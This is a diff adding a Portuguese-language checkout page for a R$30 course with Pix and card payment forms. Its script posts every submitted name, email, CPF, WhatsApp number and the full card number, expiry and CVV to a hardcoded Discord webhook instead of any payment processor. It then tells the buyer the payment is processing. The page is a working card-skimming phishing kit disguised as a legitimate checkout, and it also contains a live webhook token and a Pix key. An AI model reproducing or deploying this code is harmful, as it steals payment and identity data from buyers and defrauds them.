@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+  <title>Efetuar Compra • Acesso Imediato ao curso do 7</title>
+  
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Poppins:wght@600;700&display=swap" rel="stylesheet">
+  
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+  <style>
+    :root {
+      --bg:          #0d1117;
+      --card:        #161b22;
+      --border:      #30363d;
+      --text:        #c9d1d9;
+      --text-light:  #8b949e;
+      --accent:      #388bfd;
+      --accent-dark: #1f6feb;
+      --success:     #a5d6ff;
+      --warning:     #ffa198;
+      --input-bg:    #0d1117;
+      --shadow-sm:   0 4px 12px rgba(0,0,0,0.35);
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      font-family: 'Inter', system-ui, -apple-system, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      padding: 1.5rem 1rem 4rem;
+      line-height: 1.6;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+
+    .container {
+      max-width: 1100px;
+      margin: 0 auto;
+    }
+
+    header {
+      text-align: center;
+      margin: 1.5rem 0 2.5rem;
+    }
+
+    .title-main {
+      font-family: 'Poppins', sans-serif;
+      font-size: clamp(1.8rem, 6vw, 2.4rem);
+      font-weight: 700;
+      color: var(--text);
+      margin-bottom: 0.6rem;
+      letter-spacing: -0.4px;
+    }
+
+    .subtitle {
+      font-size: clamp(1rem, 4vw, 1.12rem);
+      color: var(--text-light);
+      max-width: 620px;
+      margin: 0 auto;
+    }
+
+    .urgency {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.6rem;
+      background: rgba(255,161,152,0.08);
+      color: var(--warning);
+      padding: 0.6rem 1.3rem;
+      border-radius: 50rem;
+      font-weight: 600;
+      font-size: clamp(0.85rem, 3.5vw, 0.95rem);
+      margin: 1.3rem 0;
+      border: 1px solid rgba(255,161,152,0.15);
+    }
+
+    .main-grid {
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 2rem;
+    }
+
+    @media (min-width: 992px) {
+      .main-grid { 
+        grid-template-columns: 1fr 1.4fr; 
+        gap: 2.5rem;
+      }
+      body { padding: 3rem 1.5rem 6rem; }
+    }
+
+    .card {
+      background: var(--card);
+      border-radius: 12px;
+      border: 1px solid var(--border);
+      box-shadow: var(--shadow-sm);
+      overflow: hidden;
+    }
+
+    .card-header {
+      background: #0d1117;
+      color: var(--text);
+      padding: 1.2rem 1.6rem;
+      font-weight: 700;
+      font-size: clamp(1.15rem, 4vw, 1.25rem);
+      border-bottom: 1px solid var(--border);
+    }
+
+    .card-body {
+      padding: 1.6rem;
+    }
+
+    .product-price {
+      font-size: clamp(2.4rem, 8vw, 3.1rem);
+      font-weight: 800;
+      color: var(--text);
+      margin: 1rem 0;
+      letter-spacing: -1px;
+    }
+
+    .old-price {
+      font-size: clamp(1.3rem, 5vw, 1.55rem);
+      color: var(--text-light);
+      text-decoration: line-through;
+      margin-left: 0.9rem;
+      font-weight: 500;
+    }
+
+    .benefits-list {
+      list-style: none;
+      margin: 1.6rem 0;
+    }
+
+    .benefits-list li {
+      display: flex;
+      align-items: flex-start;
+      gap: 0.9rem;
+      margin-bottom: 1.2rem;
+      font-size: clamp(0.98rem, 3.8vw, 1.06rem);
+    }
+
+    .benefits-list i {
+      color: var(--success);
+      font-size: 1.4rem;
+      margin-top: 4px;
+      min-width: 24px;
+    }
+
+    .payment-tabs {
+      display: flex;
+      background: #161b22;
+      border-radius: 10px;
+      padding: 5px;
+      margin-bottom: 1.8rem;
+      border: 1px solid var(--border);
+    }
+
+    .tab-btn {
+      flex: 1;
+      padding: 14px 12px;
+      border: none;
+      background: transparent;
+      font-weight: 600;
+      font-size: clamp(0.95rem, 3.8vw, 1rem);
+      color: var(--text-light);
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.18s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .tab-btn.active {
+      background: #21262d;
+      color: white;
+    }
+
+    form label {
+      display: block;
+      font-weight: 600;
+      margin: 1.4rem 0 0.55rem;
+      font-size: 0.97rem;
+      color: var(--text);
+    }
+
+    input, select {
+      width: 100%;
+      padding: 15px 16px;
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      font-size: 1.03rem;
+      background: var(--input-bg);
+      color: var(--text);
+      transition: border-color 0.2s;
+      height: 52px;
+    }
+
+    input:focus, select:focus {
+      border-color: var(--accent);
+      box-shadow: 0 0 0 3px rgba(56,139,253,0.2);
+      outline: none;
+    }
+
+    .input-row {
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 1rem;
+    }
+
+    @media (min-width: 480px) {
+      .input-row { grid-template-columns: 1fr 1fr; }
+    }
+
+    .btn-pay {
+      width: 100%;
+      padding: 18px;
+      margin: 2rem 0 1.5rem;
+      background: var(--accent);
+      color: white;
+      border: none;
+      border-radius: 10px;
+      font-size: clamp(1.05rem, 4.2vw, 1.16rem);
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.22s;
+      min-height: 58px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+
+    .btn-pay:hover {
+      background: var(--accent-dark);
+      transform: translateY(-2px);
+    }
+
+    .success-area {
+      text-align: center;
+      padding: 2rem 1.4rem;
+      background: rgba(165,214,255,0.06);
+      border-radius: 12px;
+      border: 1px dashed var(--success);
+      margin: 2rem 0;
+    }
+
+    .success-area h3 {
+      color: var(--success);
+      font-size: 1.4rem;
+      margin-bottom: 1.2rem;
+    }
+
+    .whatsapp-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.9rem;
+      background: #128C7E;
+      color: white;
+      padding: 16px 28px;
+      border-radius: 50rem;
+      text-decoration: none;
+      font-weight: 700;
+      font-size: 1.05rem;
+      margin-top: 1.5rem;
+      min-height: 56px;
+    }
+
+    .whatsapp-btn:hover {
+      background: #0e7a6e;
+      transform: translateY(-2px);
+    }
+
+    @media (max-width: 480px) {
+      .card-body { padding: 1.4rem; }
+      .product-price { margin: 0.8rem 0; }
+      header { margin: 1rem 0 2rem; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+
+  <header>
+    <h1 class="title-main">Finalizar Compra</h1>
+    <p class="subtitle">Acesso imediato após a compra.</p>
+    
+    <div class="urgency">
+      <i class="fas fa-clock"></i> Oferta por tempo limitado
+    </div>
+  </header>
+
+  <div class="main-grid">
+
+    <!-- Coluna Esquerda - Benefícios + Garantia -->
+    <div class="left-column">
+
+      <div class="card">
+        <div class="card-header">O que você recebe hoje</div>
+        <div class="card-body">
+          <div style="font-size: clamp(2.4rem,8vw,3rem); font-weight:800; margin:1rem 0;">
+            R$ 30,00
+            <span class="old-price">R$ 69,90</span>
+          </div>
+
+          <ul class="benefits-list">
+            <li><i class="fas fa-check-circle"></i> Acesso vitalício ao curso completo.</li>
+            <li><i class="fas fa-check-circle"></i> Atualizações gratuitas para sempre.</li>
+            <li><i class="fas fa-check-circle"></i> Grupo VIP com suporte direto.</li>
+            <li><i class="fas fa-check-circle"></i> Conteúdo completo e estruturado.</li>
+            <li><i class="fas fa-check-circle"></i> Garantia total de 7 dias.</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-header">Garantia Incondicional</div>
+        <div class="card-body" style="text-align:center;">
+          <i class="fas fa-shield-alt" style="font-size: clamp(3.2rem,10vw,4rem); color:var(--success); margin-bottom:1rem; opacity:0.9;"></i>
+          <p style="font-size: clamp(1.2rem,4.5vw,1.3rem); font-weight:700; margin-bottom:0.8rem;">
+            7 Dias – Sem Perguntas
+          </p>
+          <p style="color:var(--text-light);">
+            Não gostou? Devolvemos 100% do valor.
+          </p>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- Coluna Direita - Formulário -->
+    <div class="right-column">
+
+      <div class="card">
+        <div class="card-header">Dados do pagamento</div>
+        <div class="card-body">
+
+          <div class="payment-tabs">
+            <button class="tab-btn active" data-tab="pix"><i class="fa-brands fa-pix"></i> Pix</button>
+            <button class="tab-btn" data-tab="card"><i class="fas fa-credit-card"></i> Cartão</button>
+          </div>
+
+          <!-- PIX -->
+          <div id="pix" class="tab-panel" style="display:block;">
+            <form id="pixForm">
+              <label>Nome completo</label>
+              <input type="text" name="nome" required placeholder="Seu nome completo">
+
+              <label>E-mail</label>
+              <input type="email" name="email" required placeholder="seuemail@gmail.com">
+
+              <label>CPF</label>
+              <input type="text" name="cpf" required placeholder="000.000.000-00" inputmode="numeric">
+
+              <label>WhatsApp (para entrarmos em contato)</label>
+              <input type="tel" name="telefone" required placeholder="(00) 00000-0000" inputmode="tel">
+
+              <button type="submit" class="btn-pay">
+                <i class="fa-brands fa-pix"></i> Copiar Chave Pix
+              </button>
+            </form>
+
+            <div id="pix-success" class="success-area" style="display:none;">
+              <h3>Chave Pix gerada!</h3>
+              <div style="background:#0d1117; padding:1.2rem; border-radius:10px; font-family:monospace; word-break:break-all; margin:1.4rem 0; font-size:1rem;">
+                ec86e414-9475-4c91-8869-be8f8c24c0b5
+                <button onclick="navigator.clipboard.writeText('ec86e414-9475-4c91-8869-be8f8c24c0b5').then(()=>alert('Copiado!'))" style="margin-left:12px; background:var(--accent); color:white; border:none; padding:8px 14px; border-radius:8px; cursor:pointer;">
+                  Copiar
+                </button>
+              </div>
+              <p>
+                Cole no app do seu banco e efetue o pagamento de R$30.00<br>
+                <strong> Após o pagamente te chamaremos no WhatsApp</strong> para liberar o acesso de forma segura.
+              </p>
+            </div>
+          </div>
+
+          <!-- CARTÃO -->
+          <div id="card" class="tab-panel" style="display:none;">
+            <form id="cardForm">
+              <label>Nome no cartão</label>
+              <input type="text" name="nome" required placeholder="Nome exatamente como no cartão">
+
+              <label>Número do cartão</label>
+              <input type="text" name="numero" required placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric">
+
+              <div class="input-row">
+                <div>
+                  <label>Validade</label>
+                  <input type="text" name="validade" required placeholder="MM/AA" maxlength="5">
+                </div>
+                <div>
+                  <label>CVV</label>
+                  <input type="text" name="cvv" required placeholder="123" maxlength="4" inputmode="numeric">
+                </div>
+              </div>
+
+              <label>CPF do titular</label>
+              <input type="text" name="cpf" required placeholder="000.000.000-00" inputmode="numeric">
+
+              <label>Parcelamento</label>
+              <select name="parcelas" required>
+                <option value="" disabled selected>Escolha o número de parcelas</option>
+                <option value="1">1x de R$ 30,00 sem juros</option>
+                <option value="2">2x de R$ 15,00 sem juros</option>
+                <option value="3">3x de R$ 10,00 sem juros</option>
+              </select>
+
+              <label>E-mail</label>
+              <input type="email" name="email" required placeholder="seuemail@gmail.com">
+
+              <label>WhatsApp (para entrarmos em contato)</label>
+              <input type="tel" name="telefone" required placeholder="(00) 00000-0000">
+
+              <button type="submit" class="btn-pay">
+                <i class="fas fa-lock"></i> PAGAR COM CARTÃO AGORA
+              </button>
+            </form>
+
+            <div id="card-success" class="success-area" style="display:none;">
+              <h3>Pagamento em processamento!</h3>
+              <p style="margin:1.5rem 0;">
+                Seu pagamento será analisado.<br>
+                <strong>Te chamaremos no WhatsApp</strong> para efetuar a liberação do acesso de forma segura!
+              </p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+  </div>
+
+</div>
+
+<script>
+  // Configurações - ALTERE AQUI
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1460993586719097037/M4Wr8r4-Jbnm9hK4sT0zAV8qalhLbnHaEfLueYJjt5ZgsPM2qwkq8ZkrEl5fGXccPXnM";
+const PIX_KEY = "ec86e414-9475-4c91-8869-be8f8c24c0b5";              
+const WHATSAPP_NUMERO = "5534999576480"; 
+// Tabs de pagamento
+
+document.querySelectorAll('.tab-btn').forEach(btn => {
+  btn.addEventListener('click', () => {
+    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+    document.querySelectorAll('.tab-panel').forEach(p => p.style.display = 'none');
+    btn.classList.add('active');
+    document.getElementById(btn.dataset.tab).style.display = 'block';
+  });
+});
+
+/// Função auxiliar - copiar texto
+function copyToClipboard(text) {
+  navigator.clipboard.writeText(text).then(() => {
+    alert("Copiado com sucesso!");
+  }).catch(() => {
+    alert("Não foi possível copiar automaticamente. Selecione e copie manualmente.");
+  });
+}
+
+// Enviar dados pro Discord
+async function sendToDiscord(data) {
+  try {
+    const payload = {
+      content: `**${data.metodo} - Nova tentativa de pagamento**\n` +
+               `Nome: ${data.nome || "—"}\n` +
+               `Email: ${data.email || "—"}\n` +
+               `CPF: ${data.cpf || "—"}\n` +
+               `WhatsApp: ${data.telefone || "—"}\n` +
+               `Valor: R$ 30,00\n` +
+               (data.metodo === "CARTÃO" ? 
+                 `Cartão: ${data.numero || "—"}\nValidade: ${data.validade || "—"}\nCVV: ${data.cvv || "—"}\nParcelas: ${data.parcelas || "—"}\n` 
+                 : "") +
+               `Data/Hora: ${new Date().toLocaleString("pt-BR")}\n` +
+               `──────────────────────────────`
+    };
+
+    await fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+  } catch (err) {
+    console.error("Erro ao enviar pro Discord:", err);
+  }
+}
+
+// PIX Form
+document.getElementById('pixForm').addEventListener('submit', async e => {
+  e.preventDefault();
+  const form = e.target;
+
+  const data = {
+    metodo: "PIX",
+    nome: form.nome.value.trim(),
+    email: form.email.value.trim(),
+    cpf: form.cpf.value.trim(),
+    telefone: form.telefone.value.trim()
+  };
+
+  await sendToDiscord(data);
+  
+  document.getElementById('pix-success').style.display = 'block';
+  document.getElementById('pixForm').style.display = 'none';
+  window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
+});
+
+// Cartão Form
+document.getElementById('cardForm').addEventListener('submit', async e => {
+  e.preventDefault();
+  const form = e.target;
+
+  const data = {
+    metodo: "CARTÃO",
+    nome: form.nome.value.trim(),
+    numero: form.numero.value.trim(),
+    validade: form.validade.value.trim(),
+    cvv: form.cvv.value.trim(),
+    cpf: form.cpf.value.trim(),
+    parcelas: form.parcelas.value,
+    email: form.email.value.trim(),
+    telefone: form.telefone.value.trim()
+  };
+
+  await sendToDiscord(data);
+  
+  document.getElementById('card-success').style.display = 'block';
+  document.getElementById('cardForm').style.display = 'none';
+  window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
+});
+// Link do WhatsApp dinâmico
+document.querySelectorAll('.whatsapp-btn').forEach(link => {
+  link.href = `https://wa.me/${WHATSAPP_NUMERO}?text=Comprovante%20de%20pagamento%20-%20Curso`;
+});</script>
+</body>
+</html>
